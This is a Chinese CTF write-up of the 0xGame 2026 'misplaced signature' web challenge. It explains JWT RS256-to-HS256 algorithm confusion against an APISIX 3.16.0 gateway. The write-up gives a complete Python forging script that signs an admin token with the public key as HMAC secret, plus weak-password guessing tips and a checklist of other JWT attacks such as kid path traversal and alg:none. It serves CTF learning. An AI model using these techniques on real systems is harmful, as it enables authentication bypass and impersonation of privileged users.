---
title: "错位的签名：JWT 算法混淆"
description: "0xGame 2026 第一周 Web 题「错位的签名」解题报告：APISIX 网关 JWT 鉴权被 alg 头牵着走，RS256 → HS256 算法混淆，拿公开公钥当 HMAC 密钥伪造 admin token。含 JWT 基础、状态码排查表、通用检查清单与最短复现路径。"
image: /assets/可爱捏，girl.jpg
date: 2026-10-05
categories:
  - 比赛
  - 0xGame2026-w1
tags:
  - CTF
  - Web
  - JWT
  - Writeup
type: tech
---


## 错位的签名

### 题目信息

| 项目 | 内容 |
| --- | --- |
| 题面 | 「一个普通的 jwt 验证系统……但似乎配置有些问题？」 |
| 分类 | Web / JWT 鉴权 / 组件已知漏洞 |
| 涉及组件 | **Apache APISIX 3.16.0** 的 `jwt-auth` 插件 |
| 漏洞类型 | **JWT 算法混淆（Algorithm Confusion）**，即 RS256 → HS256 |

---

### 原理

网关**用 token 头里写的 `alg` 决定用什么算法验签**。我声明 `alg=HS256`（对称算法），
它就改用 HMAC 验签，而它配置里的密钥正是**公开的 RS256 公钥文本** ——
于是我拿同一段公钥文本做 HMAC 签名，就能伪造出 `key=admin` 的合法 token，**全程不需要私钥**。

---

### 一、基础知识

#### 1. 什么是「网关」，为什么本题的校验不在应用里

```
浏览器  ──►  APISIX 网关  ──►  后端应用(Flask)
             ↑ 拦截并校验 JWT
```

**为什么要先分这一层？** 攻击面完全不同：

- 校验在**应用**里 → Flask session / SQL 注入 / 反序列化那套工具
- 校验在**网关**里 → 「伪造网关认可的东西」，比如伪造 HTTP 头、伪造 JWT

**判断方法：看响应头 `Server:` 和 `Www-Authenticate:`。** 本题返回：

```
Server: APISIX/3.16.0
Www-Authenticate: Bearer realm="jwt"
```

`realm="jwt"` 是网关在明确告诉你「这里用 JWT 认证」。

#### 2. JWT 的三段结构

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9 . eyJrZXkiOiJndWVzdCIsInNvbSI6Imd1ZXN0Ijo… . 签名
        ① 头部 Header                        ② 载荷 Payload                          ③ 签名
       base64url，明文                      base64url，明文                    256 字节二进制
```

三段**各自独立编码**，用 `.` 连接。所以头部和载荷是**明文可读、可改**的。

#### 3. base64 不是加密

| | 作用 |
| --- | --- |
| **base64** | 把二进制塞进 URL/JSON 能安全传输 |
| 加密 | 保密 |

头部和载荷解出来是 UTF-8 的 JSON 文本所以能读；签名是 256 字节二进制所以显示乱码。

#### 4. RS256 和 HS256 是两套完全不同的东西

| | **RS256**（非对称 / RSA） | **HS256**（对称 / HMAC） |
| --- | --- | --- |
| 签名用什么 | **私钥**（只有服务端有） | **同一个密钥** |
| 验签用什么 | **公钥**（人手一份，公开） | 同一个密钥 |
| 密钥泄露后果 | 拿到公钥**啥也干不了** | 拿到密钥 = **能签能验 = 完全伪造** |
| 签名长度 | **256 字节**（RSA-2048） | **32 字节**（SHA256 输出） |

#### 5. payload 里的时间戳字段

| 字段 | 全称 | 含义 |
| --- | --- | --- |
| `exp` | expiration | **过期时间**。当前时间 > `exp` → 作废 |
| `nbf` | not before | **最早可用时间**。当前时间 < `nbf` → 作废 |
| `iat` | issued at | 签发时间（本题没放） |

时间戳是 **Unix 秒级**（不是毫秒）。

**为什么 forge 时要把 `nbf` 调早、`exp` 调晚？** 有些网关严格校验这两项。
**如果抄 guest 的 `exp`，等你真正用到时可能已过期 → 你会误判成「算法混淆失败」
先排除时间因素，再怀疑签名因素。**

#### 6. 术语

| 术语 |  |
| --- | --- |
| **PEM** | 公钥/私钥的文本格式，`-----BEGIN PUBLIC KEY-----` 开头 |
| **base64url** | base64 的 URL 安全变体，去掉尾部 `=` 填充（`=` 在 URL 里有特殊含义） |
| **Algorithm Confusion** | 算法混淆。本题漏洞。网关信 alg 导致对称/非对称密钥混用 |
| **`key_claim_name`** | APISIX `jwt-auth` 的配置项，指定 payload 里**哪个字段是身份**。**默认就是 `key`** |
| **`kid` / `jwk` / `jku` / `x5u`** | JWT 头里携带密钥标识/密钥/密钥地址的字段，是另一类注入面 |

---

### 二、实战复盘

#### 1.看响应头，锁定攻击层

```powershell
curl.exe -s -i "http://9080-fa448734-…challenge.ctfplus.cn/login"
```

**看三处：**

```
Server: APISIX/3.16.0                             ← ① 网关
<p class="eyebrow">APISIX JWT CTF</p>             ← ② 题目提示
提示：已知系统中存在一个普通用户账号 guest        ← ③ 题面送账号
```

![image-20261002193110248](/assets/cuowei-jwt-confusion/image-20261002193110248.png)

#### 2.用 guest 登进去（弱口令按「出现频率」排序试）

弱口令**有优先级**：

```
① 用户名本身     guest / guest        ← 手写 demo 最常见
② 用户名+数字    guest123 / guest666   ← 题库/示例项目最常见
③ 万能弱口令     123456 / password / 111111
④ 空密码 / 空格
```

为什么要按顺序：因为有速率限制，乱试会被锁。按「出现频率」排，高概率放前面，
**基本不用上 hydra/sqlmap **

##### 2.1使用终端

```powershell
curl.exe -s -i -X POST "http://…/login" -d "username=guest&password=guest123"
```

成功标志：`302 → /dashboard` + `Set-Cookie: session=.eJx…`（Flask 会话，只是进站门票，本题**不用碰它**）。

![image-20261002194130698](/assets/cuowei-jwt-confusion/image-20261002194130698.png)

##### 2.2或者用界面登陆进去

![image-20261002193624634](/assets/cuowei-jwt-confusion/image-20261002193624634.png)

![image-20261002194311997](/assets/cuowei-jwt-confusion/image-20261002194311997.png)

右键查看源码

![image-20261002194419129](/assets/cuowei-jwt-confusion/image-20261002194419129.png)

点击可以跳转到另一个画面，上面是JWT，他说使用guest登录会权限不足，所以我们要换个账号admin

![image-20261002194514930](/assets/cuowei-jwt-confusion/image-20261002194514930.png)

#### 3.抓 dashboard

```
未登录页面  →  只知道"入口在哪"
已登录页面  →  全站地图 + 凭证样本 + 弹药位置
```

登录前服务器只给你一个登录框，**路由表是藏起来的**；而 dashboard 上的 `<nav>` 导航栏是**开发者自己写的全站路由清单** ，**网页里作者主动列出的链接，信息密度远高于盲扫出来的 200/404。**

它给了你三样东西：

- **目标 + 参数名**：`/flag?jwt=<一整串token>` → 知道 token 可以放 URL query
- **一个真实 token 样本** 
- **弹药位置**：`/public-key`（公钥）、`/hint`（漏洞提示）

##### 3.1使用终端

```powershell
curl.exe -s "http://…/dashboard" -H "Cookie: session=<粘上一步的session>"
```

![image-20261002201919308](/assets/cuowei-jwt-confusion/image-20261002201919308.png)

> 那一页公钥本身**毫无价值**（谁都能看到），它的价值在于它是**整个逻辑漏洞的支点**。题眼是那半句「**网关和客户端都会信任它**」——它把一段「人人都知道」的东西，变成了网关手里「拿来当密钥」的东西。**一旦对称和非对称的密钥来源混用，公开的公钥就自动变成了私钥。**

###### (1)页面给的是 **PEM / SPKI 格式的 RSA 公钥**：

```
-----BEGIN PUBLIC KEY-----      ← SPKI 头（不是 CERTIFICATE！）
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA79XYBopfnVMKxI533oU2
...（7 行 base64）...
BQIDAQAB
-----END PUBLIC KEY-----
```

拆开看：

| 项                | 值                     | 说明                                      |
| ----------------- | ---------------------- | ----------------------------------------- |
| PEM 文本长度      | **450 字节**           | 这就是后面 HMAC 密钥的字节数              |
| base64 解码后 DER | 294 字节               | ASN.1 二进制                              |
| DER 开头          | `30 82 01 22`          | ASN.1 `SEQUENCE`，长度域用长格式          |
| 算法 OID          | `1.2.840.113549.1.1.1` | = **rsaEncryption**，纯公钥，**不含证书** |
| 模数 n            | **2048 bit**           |                                           |
| 公钥指数 e        | **65537**（`0x10001`） | 标准取值，不用管                          |

**BEGIN PUBLIC KEY**

| 头                  | 里面有什么                                | 你能推出什么                                    |
| ------------------- | ----------------------------------------- | ----------------------------------------------- |
| `BEGIN PUBLIC KEY`  | 只有 (n, e)                               | 只有公钥 → **拿不到私钥，也拿不到任何用户信息** |
| `BEGIN CERTIFICATE` | 公钥 + 签名 + **主体信息**（CN/O/有效期） | 能看到「谁签的、给谁的、什么时候失效」          |

这里是 `PUBLIC KEY`，所以这页**不会泄露任何额外情报**——别再指望从它里面挖出用户列表或私钥线索了。
**它的唯一作用就是：给你一段「服务器手里有、你也拿得到」的字节串。**

###### (2)公钥在正常情况没什么用

RS256 是**非对称签名**。正常流程：

```
admin：  用【私钥】对 payload 做签名  →  token 第三段
网关：  用【公钥】验签                 →  s^e mod n，比对哈希
```

关键在于：**你只有公钥，数学上造不出能让这个公钥验过的签名。**

所以在正常 CTF 里，看到公钥页的标准反应是「**这条线索是死的**」——
要去进行爆破私钥（ 数学上无解，出题人一版不会这么设计）、去找私钥泄露（ 页面上没有）。

**记住这个判断，能帮你省掉大量时间：非对称算法 + 只有公钥 = 死路。**

###### (3)把「网关和客户端都会信任它」

```
这是 admin 账户用于 RS256 验签的公钥，网关和客户端都会信任它。
                          ▲                    ▲          
                       身份线索                 关键         
```

**「网关信任它」的含义是：网关会把它交给某个加密函数去用。**

那么问题就来了——**网关到底用哪段密钥、做什么运算，是 token 头里 `alg` 说了算的，还是网关自己定的？**

```
安全的网关：算法 = 我配置里写死的值（RS256）      ← 不听客户端的
本题的网关：算法 = token 头里 alg 写的值           ← 听了  ←← 漏洞在这
```

一旦算法由**客户端在 token 里指定**，你就获得了「**让服务端自己换一套密钥体系**」的能力。
这就是算法混淆的入口。

###### (4)核心机制：对称 / 非对称密钥来源混用

**崩溃过程（分5 步）：**

```
① 我在 token 头里写 alg: HS256
        ↓
② 网关想：「HS256 是对称算法，密钥就是我配置的 key 字段值——
        而那个 key 正是这段 PEM 公钥文本！」
        ↓
③ 于是它拿【公钥文本】当 HMAC 密钥去验签
        ↓
④ 我也拿【同一段公钥文本】当 HMAC 密钥签名 → 签名必然一致 → 验签通过
        ↓
  冒充 admin 成功，全程不需要私钥
```

**为什么第 ④ 步「必然一致」？** 因为 HMAC 是**对称**的：

```
HMAC(密钥 K, 内容 M) 的计算过程里，K 和 M 的地位是对称的。
谁拿到 K 谁就能算，M 也是自己写的。
```

对比一下：RSA 签名里私钥和公钥**不是对称的**，所以有公钥没用。
**同一个「密钥」变量，被塞进了两种性质完全不同的算法里，这就是漏洞的全部。**

**手写 forge（核心就这三行）：**

```python
import base64, hmac, hashlib, json, time

PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA79XYBopfnVMKxI533oU2
...（7 行 base64）...
-----END PUBLIC KEY-----"""          # 注意结尾引号前面没有换行 → 正好 450 字节

def b64u(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

now = int(time.time())
header = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))   # ① 换 alg
payload = b64u(json.dumps({"key": "admin",                                    # ② key 改 admin
                           "nbf": now - 600,
                           "exp": now + 3600}, separators=(",", ":")))
signing_input = f"{header}.{payload}".encode()
sig = b64u(hmac.new(PUBLIC_KEY.encode(), signing_input, hashlib.sha256).digest())  # ③ 公钥当密钥
print(f"{header}.{payload}.{sig}")
```

| 行                     | 为什么这么写                                                 |
| ---------------------- | ------------------------------------------------------------ |
| ①                      | **核心**：骗网关换算法（写成 `hs256` 小写会 500，**大小写敏感**） |
| ②                      | `key` 才是真正起作用的身份字段，`role`/`sub` 改了没用        |
| ③                      | 公钥原文当 HMAC 密钥，**`\n` 必须全部保留**                  |
| `separators=(",",":")` | JSON 不要多余空格，否则 base64 对不上                        |
| `.rstrip(b"=")`        | base64url 规范要去掉尾部 `=` 填充                            |

###### (5)从这一页能看大到的四条信息

| #    | 信息                                        | 怎么用                                                       |
| ---- | ------------------------------------------- | ------------------------------------------------------------ |
| 1    | **算法是 RS256**                            | 默认路线（HS256 直签）一定失败，**必须混淆**                 |
| 2    | **密钥字节数 450**                          | 决定 HMAC 密钥的字节形态                                     |
| 3    | **"admin **账户**"**                        | 权限藏在**账号身份**里，不是角色 → 优先去 payload 里找账号类字段 |
| 4    | **`Server: APISIX/3.16.0`**（另一处响应头） | 网关层漏洞，可查官方 CVE 确认修复版本                        |

###### (6) 状态码（排查神器）

| 现象                                | 含义                       | 卡在哪一环                               |
| ----------------------------------- | -------------------------- | ---------------------------------------- |
| `401 Missing JWT token`             | token 没传到               | 参数名/位置错了                          |
| `401 missing user key in JWT token` | payload 里**没有 `key`**   | payload 结构不对（**在验签之前就检查**） |
| `401 Invalid user key in JWT token` | `key` 的值**不是合法用户** | 身份字段值猜错（如填了 `admin1`）        |
| `401 failed to verify jwt`          | **验签没过**               | 算法不对，或密钥字节不对                 |
| `401 JWT token invalid`             | 网关认识但拒了这个 alg     | `alg` 不在白名单                         |
| `403 权限不足`                      | **验签过了**，只是身份不够 | 提权字段没改对                           |
| `500 Internal Server Error`         | 网关代码崩了               | alg 走到了没实现的分支                   |

**两个最有价值的区分：**

1. **`401 failed to verify` vs `403`**
	`403` 意味着**签名验证已经通过**，问题只剩身份。**方向对了，只差一步。**直接回去改身份字段。

2. **`401 missing/Invalid user key` vs `401 failed to verify`**
	前者说明**网关连签名都还没验**（因为它要先拿 `key` 去做用户查找）。
	**这个报错的先后顺序** —— 它告诉你网关的代码执行顺序。

**技巧：签名长度是「网关信不信 alg」的指纹**

```
base64url：每 3 字节 → 4 字符
RS256 → 256 字节 → 342 字符
HS256 →  32 字节 →  43 字符
```

你伪造的 token 第三段是 43 字符 → 网关真的按你写的 `alg` 走了。
长度不对 → 网关没信你。

###### (7) 无解清单

| 路线                       | 为什么死                                                     |
| -------------------------- | ------------------------------------------------------------ |
| 爆破 RSA 私钥 / 分解 n     | **数学上无解**。n 是 2048 位，没有因子分解的实际算法。出题人不会这么设计 |
| `alg: none`                | 网关有白名单，实测 401                                       |
| `kid` 头注入指向公钥文件   | 网关不查 kid，实测无效                                       |
| 内嵌 `jwk` 到 header       | 网关不读                                                     |
| 把 `role`/`sub` 改成 admin | **无效**，因为网关只读 `key`                                 |
| 用 hashcat 爆破密钥        | 就算爆破出 HMAC 密钥也没用——**你已经有密钥了**（公钥文本本身） |

##### 3.2使用网页

###### （1）点击公钥页面

![image-20261002200912299](/assets/cuowei-jwt-confusion/image-20261002200912299.png)

![image-20261002200947607](/assets/cuowei-jwt-confusion/image-20261002200947607.png)

###### （2）点击Hint页面

![image-20261002201310630](/assets/cuowei-jwt-confusion/image-20261002201310630.png)

![image-20261002201331709](/assets/cuowei-jwt-confusion/image-20261002201331709.png)

可以看到题目给的线索

#### 4.解开 token，逐字段读懂

**正确做法（先按 `.` 切分再逐段解）：**

```powershell
python -c "import base64;f=lambda x:base64.urlsafe_b64decode(x+'='*(-len(x)%4));t='<整串token>';[print(n,'=',f(t.split('.')[i]).decode()) for i,n in enumerate(['Header','Payload'])]"
```

```
Header  = {"alg":"RS256","typ":"JWT"}
Payload = {"key":"guest","role":"guest","sub":"guest","exp":1790821552,"nbf":1790817892}
Signature 长度 = 256 字节      ← 和 RS256 对上了
```

| 字段 | 值 | 含义 | 改不改 |
| --- | --- | --- | --- |
| `alg` | `RS256` | **签名算法** | **本题突破口** |
| `typ` | `JWT` | token 类型 |  |
| `key` | `guest` | **身份字段**（APISIX `key_claim_name` 默认值） | **必须改 admin** |
| `role` | `guest` | 角色 —— **实测发现完全没用** |  |
| `sub` | `guest` | subject —— **实测发现完全没用** |  |
| `exp` / `nbf` | — | 过期/生效时间 | 调宽，避免误判 |

![image-20261002203930150](/assets/cuowei-jwt-confusion/image-20261002203930150.png)

#### 5.建立基线（很重要）

**什么是基线？用「一个确定合法的凭证」访问目标，看服务端正常的拒绝长什么样。**

```powershell
curl.exe -s -i "http://…/flag?jwt=<Step5那串真实token>"
```

```
HTTP/1.1 403 Forbidden
<h1>权限不足</h1>
APISIX 当前识别到的用户是：<code>guest</code>
```

![image-20261002204810811](/assets/cuowei-jwt-confusion/image-20261002204810811.png)

**为什么要做这步：**

- **确认链路是通的** —— 参数名对、token 格式被接受。如果这里 401，说明你传的位置错了。
	**先确认链路通，再折腾签名。**
- *精确告诉你哪个身份不够** —— 「识别到的用户是 guest」是**网关自己说的**。
- **给你「正常拒绝」的样本，用来对比「异常拒绝」** —— 见下表。

#### 7.读 hint，定位到 `alg`

Hint 页面的四条线索，**合起来指向同一件事**：

| 线索 | 推出什么 |
| --- | --- |
| `Apache APISIX 3.16.0`，「已知受影响的历史版本」 | 漏洞在网关组件，有官方公告 |
| 「漏洞和 JWT 有关」 | 方向锁定 JWT |
| 「如果一个系统**既信公钥，又信 token 头里的 alg**，会发生什么」 | **解题钥匙** |

**最后一条是逻辑漏洞的精确描述：**
正常的验签流程里，**服务器应该自己决定用什么算法（配置写死 RS256），而不是让客户端在 token 里指定。**

#### 8.forge（核心三行）

```python
header = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))   # ① 换 alg
body   = b64u(json.dumps(payload, separators=(",", ":")))                            # ② key 改 admin
signing_input = f"{header}.{body}".encode()
signature = b64u(hmac.new(PUBLIC_KEY.encode(), signing_input, hashlib.sha256).digest())  # ③ 公钥当密钥
```

| 行 | 为什么这么写 |
| --- | --- |
| ① | **核心**：骗网关换算法 |
| ② | `key` 改成 `admin`（真正起作用的就是它） |
| ③ | **公钥原文当 HMAC 密钥**，`\n` 必须全部保留 |
| — | `separators=(",",":")`：JSON 不要多余空格，否则 base64 对不上 |
| — | `.rstrip(b"=")`：base64url 去掉尾部 `=` 填充 |

**最小可用的 payload（实测就够）：**

```json
{"key":"admin","nbf":<now-600>,"exp":<now+3600>}
```

建立一个jwt_forge.py，写入：

```
"""APISIX 3.16.0 jwt-auth 算法混淆 (RS256 -> HS256) forge

用法:
    python jwt_forge.py "<靶场网址>"
    python jwt_forge.py "<网址>" --no-newline   # 对照实验: 去掉 PEM 换行 -> 预期 401

原理:
    网关从 token 头里读 alg, 我们声明 HS256(对称);
    而网关配置的 key 正是 admin 的 RS256 公钥文本,
    于是它拿公钥文本当 HMAC 密钥验签 -> 我们用同一文本签即可通过。
"""
import base64
import hashlib
import hmac
import json
import re
import sys
import time

import requests

DEFAULT_BASE = "http://9080-2bf8b368-6a2b-4cf9-ba11-53e1d4b4c649.challenge.ctfplus.cn"

# 注意: 必须与网页上看到的完全一致, 换行符也要保留
PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA79XYBopfnVMKxI533oU2
VFQbEdSPtWRD+xSl73lHLVboGP1lSIZtnEj5AcTN2uDW6AYPiWL2iA3lEEsDTs7J
BUXyl6pysBPfrqC8n/MOXKaD4e8U5GAHFiwHWg2WzHlfFSlFkLjzp0vPkDK+fQ4C
lrd7shAyitB7use6DHcVCKuI4bFOoFbdI5sBGeyoD833g+ql9bRkH/vf8O+rPwHA
M+47r1iv3lY3ex0P45PRd7U7rq8P8UIw6qOI1tiYuKlFJmjFdcwtYG0dctxWwgL1
+7njrVQoWvuOTSsc9TDMhZkmmSsU3wXjaPxJpydck1C/w9ZLqsctKK5swYWhIcbc
BQIDAQAB
-----END PUBLIC KEY-----"""


def b64u(data):
    """base64url 编码: URL-safe 且去掉尾部 = 填充"""
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def forge(payload, secret, alg="HS256"):
    header = b64u(json.dumps({"alg": alg, "typ": "JWT"}, separators=(",", ":")))
    body = b64u(json.dumps(payload, separators=(",", ":")))
    signing_input = f"{header}.{body}".encode()
    if isinstance(secret, str):
        secret = secret.encode()
    signature = b64u(hmac.new(secret, signing_input, hashlib.sha256).digest())
    return f"{header}.{body}.{signature}"


def main():
    args = [a for a in sys.argv[1:] if not a.startswith("--")]
    base = args[0] if args else DEFAULT_BASE
    secret = "".join(PUBLIC_KEY.split()) if "--no-newline" in sys.argv else PUBLIC_KEY

    now = int(time.time())
    payload = {
        "key": "admin",
        "role": "admin",
        "sub": "admin",
        "nbf": now - 600,
        "exp": now + 3600,
    }

    token = forge(payload, secret)
    h, p, s = token.split(".")
    print(f"[+] base       : {base}")
    print(f"[+] key format : {'PEM with newlines' if secret is PUBLIC_KEY else 'PEM stripped (对照实验)'}")
    print(f"[+] header     : {base64.urlsafe_b64decode(h + '=' * (-len(h) % 4)).decode()}")
    print(f"[+] payload    : {base64.urlsafe_b64decode(p + '=' * (-len(p) % 4)).decode()}")
    print(f"[+] sig length : {len(base64.urlsafe_b64decode(s + '=' * (-len(s) % 4)))} bytes "
          f"(HS256 应为 32, RS256 为 256)")

    response = requests.get(base + "/flag", params={"jwt": token}, timeout=20)
    print(f"[-] status     : {response.status_code}")
    print(response.text.strip()[-400:])

    flag = re.search(r"0xGame\{[^}]*\}", response.text)
    if flag:
        print(f"\n[FLAG] {flag.group(0)}")
        return 0
    print("\n[-] 未取到 flag, 请对照状态码表排查")
    return 1


if __name__ == "__main__":
    sys.exit(main())

```

跑：

```
python "C:\Users\HelloCTF_OS\Desktop\错位的签名\jwt_forge.py" "http://…challenge.ctfplus.cn"
```

![image-20261005191837324](/assets/cuowei-jwt-confusion/image-20261005191837324.png)

---

### 三、算法混淆原理

#### 漏洞:

**把「只有我有」的东西（私钥）和「人人都知道」的东西（公钥）放进了同一个变量。**
一旦对称/非对称的密钥来源混用，**公开的公钥就自动变成了私钥**。

#### 崩溃过程

```
token 头写 alg: HS256
      ↓
网关想：'HS256 是对称算法，密钥就是我配置的 key —— 而 key 正是那段 PEM 公钥文本！'
      ↓
于是拿公钥文本当 HMAC 密钥去验签
      ↓
我也拿同一段公钥文本当 HMAC 密钥签名 → 签名必然一致 → 验签通过
      ↓
冒充 admin 成功，全程不需要私钥
```

#### 「网关节制 token 头的 alg」是重点

```
安全的网关：算法 = 我配置里写死的值（RS256）    ← 不听客户端的
本题的网关：算法 = token 头里 alg 写的值        ← 听了 ←← 漏洞在这
```

一旦算法由客户端指定，你就能声明任何算法，**服务端失去了「用哪种密钥体系」的决定权**。

### 四、状态码对照（排查）

| 现象 | 含义 | 卡在哪一环 |
| --- | --- | --- |
| `401 Missing JWT token` | token 没传到 | 参数名/位置错了 |
| `401 missing user key in JWT token` | payload 里**没有 `key` 字段** | payload 结构不对（**在验签之前就检查**） |
| `401 Invalid user key in JWT token` | `key` 字段的值**不是合法用户**（如 `admin1`） | 身份字段值猜错 |
| `401 failed to verify jwt` | **验签没过** | 算法不对，或密钥字节不对 |
| `401 JWT token invalid` | 网关识别了但拒了这个 alg | `alg` 不被允许 |
| `403 权限不足` | **验签过了**，身份不够 | 提权字段没改对 |
| `500 Internal Server Error` | 网关代码崩了 | alg 走到没实现的分支 |

**最重要的两个区分：**

1. **`401 failed to verify` vs `403`**：`403` 意味着**签名验证已经通过**，问题只剩身份 —— **方向对了，只差一步**。
2. **`401 missing/Invalid user key` vs `401 failed to verify`**：前者说明 **payload 结构/身份字段值**的问题，
   **网关连签名都还没验**（因为它要先拿 `key` 字段去做用户查找）。**这个报错顺序本身就是重要情报。**

#### 签名长度是「网关信不信 alg」的指纹

```
base64 每 3 字节 → 4 字符
RS256 → 256 字节 → 342 字符
HS256 →  32 字节 →  43 字符
```

---

### 五、JWT 题通用检查清单

```
□ 拿到 token 样本？→ 解开三段，逐字段读懂
□ 头部 alg 是什么？
   ├─ HS256 且 key 疑似公开/弱 → 直接拿 key 签（对称密钥泄露，最常见）
   │      └─ 猜不出来 → hashcat -m 16500 + rockyou
   └─ RS256 / ES256 / PS256（非对称）
        □ 能拿到公钥？□ 算法是否由 token 的 alg 决定？
           └─ 都是 → ★ alg 混淆（本题）
        □ 都没有 → 试下面这些
              □ alg:none（空签名 / 垃圾签名）
              □ kid 头注入（../../etc/passwd、../../dev/null → 空密钥）
              □ jwk / jku / x5u 头注入
              □ alg 写 RS256 但用 HMAC 签名（验证 alg 是不是真被读）
              □ alg 名大小写是否写对（HS256 不能写 hs256）
              □ 硬编码 alg 时 → 找密钥泄露（源码/配置/Git 历史/日志）
□ 建基线：用合法凭证访问目标，记住「正常拒绝」的样子
□ 用状态码区分「没传对 / 缺字段 / 值不对 / 验签错 / 身份不够」
□ 记下签名长度，用它自查网关有没有信 alg
□ 注意 exp / nbf，排除时间因素再怀疑签名
□ 密钥必须字节级一致 → print(len(密钥.encode())) 核对
□ 别浪费时间爆破私钥（数学上无解）
```

#### 拿不到公钥时，还有哪些路可走

**前提不变：只有当网关「听 token 头的 alg」时，这些才有效。**

| 手段 | 说明 |
| --- | --- |
| **换一种非对称 alg** | `ES256` 的密钥也是公开公钥，同样能做 HMAC 混淆；签名长度 **64 字节** |
| **`alg: none`** | 免签名。本题实测被拒（实验 D） |
| **`kid` 注入** | `{"alg":"HS256","kid":"../../../../dev/null"}` → 密钥变空串，你用空串签即可 |
| **对称 alg + 弱密钥** | 换 `hashcat -m 16500`（HS256） |
| **RSA padding 缺陷** | Bleichenbacher 类，实现层漏洞 |

---

### 六、最短复现路径

```powershell
######### 1.（可选）登录拿 cookie —— 其实本题 forge 不需要
curl.exe -s -i -X POST "http://…/login" -d "username=guest&password=guest123"

######### 2. 从 /public-key 抄下 PEM 原文（保留内部换行，末尾通常多一个 \n 要去掉）

######### 3. 跑 forge（封装了 4 步：改 alg / 改 key / 公钥当 HMAC 密钥 / 去 base64 填充）
python "C:\Users\HelloCTF_OS\Desktop\错位的签名\jwt_forge.py" "http://…challenge.ctfplus.cn"

######### 4. 对照实验：证明"密钥必须字节级一致"
python "C:\Users\HelloCTF_OS\Desktop\错位的签名\jwt_forge.py" "http://…challenge.ctfplus.cn" --no-newline

######### 5. 三组实验
python "C:\Users\HelloCTF_OS\Desktop\错位的签名\exp_lab.py"       "http://…challenge.ctfplus.cn"
python "C:\Users\HelloCTF_OS\Desktop\错位的签名\exp_keyfield.py"  "http://…challenge.ctfplus.cn"
python "C:\Users\HelloCTF_OS\Desktop\错位的签名\exp_practice.py"  "http://…challenge.ctfplus.cn"
```

**同类题的通用套路（可迁移）：**

```
解 JWT 前的四个问题：
  ① 服务端从哪个「原件」读你的身份？（payload / HTTP头 / cookie）→ 本题：payload
  ② 原件里哪个「字段」是身份？                        → 本题：key
  ③ 那个原件用什么保护？（签名算法是什么？密钥从哪来？谁能拿到？）→ 本题：RS256 公钥，人人可拿
  ④ 保护机制自己可信吗？（算法是不是由客户端指定？）  → 本题：不可信 ★ 漏洞在这
```